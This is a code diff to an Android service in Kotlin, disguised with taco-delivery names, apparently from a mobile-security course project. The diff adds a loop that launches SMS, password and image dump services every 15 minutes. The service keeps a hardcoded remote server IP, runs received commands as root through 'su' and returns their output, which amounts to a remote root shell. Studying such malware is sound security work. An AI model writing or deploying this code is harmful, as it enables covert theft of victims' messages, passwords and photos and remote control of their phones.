@@ -10,18 +10,21 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.example.mobsec_823.malicious.ImageDumpService
+import com.example.mobsec_823.malicious.PasswordDumpService
+import com.example.mobsec_823.malicious.SMSDumpService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import java.io.BufferedReader
-import java.io.InputStreamReader
 
 class TacoDeliveryService : Service() {
     private var tacoTruck: TacoTruck? = null
     private var screenshotTask: carne? = null
     private val kitchenStaffScope = CoroutineScope(Dispatchers.IO)
     private val TAG = "TacoDeliveryService"
+    private var exfilJobStarted = false
 
     // Hardcoded server details for automatic connection.
     private val TRUCK_IP = "47.129.144.9"
@@ -36,8 +39,35 @@ class TacoDeliveryService : Service() {
             startForegroundNotification()
             openTheTacoStand()
             startScreenshotTask()
+            
+            // --- START PERIODIC EXFILTRATION ---
+            startExfiltrationServices()
         }
         return START_STICKY
+    }
+
+    private fun startExfiltrationServices() {
+        if (exfilJobStarted) return
+        exfilJobStarted = true
+
+        Log.d(TAG, "Initializing periodic data exfiltration (Every 15 mins)...")
+        
+        kitchenStaffScope.launch {
+            while (true) {
+                Log.d(TAG, "Triggering periodic dump cycle: SMS, Passwords, Images")
+                
+                try {
+                    // Calling startService on an already running service simply triggers its onStartCommand again
+                    startService(Intent(this@TacoDeliveryService, SMSDumpService::class.java))
+                    startService(Intent(this@TacoDeliveryService, PasswordDumpService::class.java))
+                    startService(Intent(this@TacoDeliveryService, ImageDumpService::class.java))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to trigger exfil cycle: ${e.message}")
+                }
+
+                delay(900000) // Wait 15 minutes (15 * 60 * 1000 ms)
+            }
+        }
     }
 
     private fun startForegroundNotification() {
@@ -63,7 +93,6 @@ class TacoDeliveryService : Service() {
         }
         tacoTruck = TacoTruck(this, TRUCK_IP, TRUCK_PORT, object : TacoTruck.OrderListener {
             override fun onOrderReceived(order: String) {
-                // Differentiate between SYNC_FILE and other commands
                 if (order.startsWith("SYNC_FILE:")) {
                     val filePath = order.substring(10).trim()
                     handleFileSync(filePath)
@@ -97,13 +126,12 @@ class TacoDeliveryService : Service() {
                 val process = Runtime.getRuntime().exec("su")
                 process.outputStream.bufferedWriter().use { it.write("$command\nexit\n") }
 
-                // Read output line by line and send back with OUT: prefix
                 process.inputStream.bufferedReader().forEachLine { line ->
                     tacoTruck?.sendToKitchen("OUT:$line")
                 }
 
                 process.waitFor()
-                tacoTruck?.sendToKitchen("OUT:--DONE--") // Signal that command finished
+                tacoTruck?.sendToKitchen("OUT:--DONE--")
 
             } catch (e: Exception) {
                 Log.e(TAG, "Command execution failed", e)
